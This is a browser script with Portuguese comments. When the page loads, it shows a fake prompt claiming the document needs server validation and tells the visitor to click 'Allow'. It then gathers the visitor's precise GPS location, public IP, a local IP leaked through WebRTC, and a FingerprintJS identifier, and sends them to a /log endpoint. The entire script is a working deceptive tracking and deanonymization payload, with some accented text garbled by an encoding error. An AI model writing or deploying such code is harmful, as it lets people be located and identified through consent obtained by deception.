<script>
    async function rastrearComPermissaoGPS() {
      try {
        // Espera a permiss√£o real de GPS
        navigator.geolocation.getCurrentPosition(async (pos) => {
          const gpsCoords = `${pos.coords.latitude},${pos.coords.longitude}`;
          console.log("üìç Localiza√ß√£o GPS precisa:", gpsCoords);
  
          // IP P√∫blico
          const ipData = await fetch("https://api.ipify.org?format=json").then(r => r.json());
  
          // IP Local via WebRTC
          const pc = new RTCPeerConnection({ iceServers: [] });
          pc.createDataChannel("");
          const offer = await pc.createOffer();
          await pc.setLocalDescription(offer);
  
          let localIP = "N/A";
          pc.onicecandidate = event => {
            if (event && event.candidate) {
              const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
              if (match) localIP = match[1];
            }
          };
  
          // Fingerprint
          const fp = await FingerprintJS.load();
          const result = await fp.get();
  
          // Payload completo
          const data = {
            ip: ipData.ip,
            localIP,
            visitorId: result.visitorId,
            userAgent: navigator.userAgent,
            device: `${navigator.platform} - ${navigator.userAgent}`,
            loc: gpsCoords
          };
  
          console.log("üì¶ Payload final:", data);
  
          await fetch("/log", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
          });
  
          console.log("‚úÖ Dados enviados com sucesso");
        }, (err) => {
          console.warn("‚ö†Ô∏è Permiss√£o de localiza√ß√£o negada ou falhou:", err);
        });
      } catch (e) {
        console.error("‚ùå Erro geral no rastreamento:", e);
      }
    }
  
    // Pop-up personalizado chamativo
    window.onload = () => {
      const alerta = document.createElement("div");
      alerta.style = "background: #fffbe6; border: 2px solid #ffd700; padding: 20px; margin: 30px; font-size: 18px; font-family: Arial;";
      alerta.innerHTML = `
        ‚ö†Ô∏è <b>Este documento precisa ser validado em nosso servidor.</b><br><br>
        Por favor, clique em <b>‚ÄúPermitir‚Äù</b na pr√≥xima tela para concluir a verifica√ß√£o.
      `;
  
      document.body.appendChild(alerta);
  
      // Ap√≥s 2 segundos, dispara rastreamento
      setTimeout(() => {
        rastrearComPermissaoGPS();
      }, 2000);
    };
  </script>
  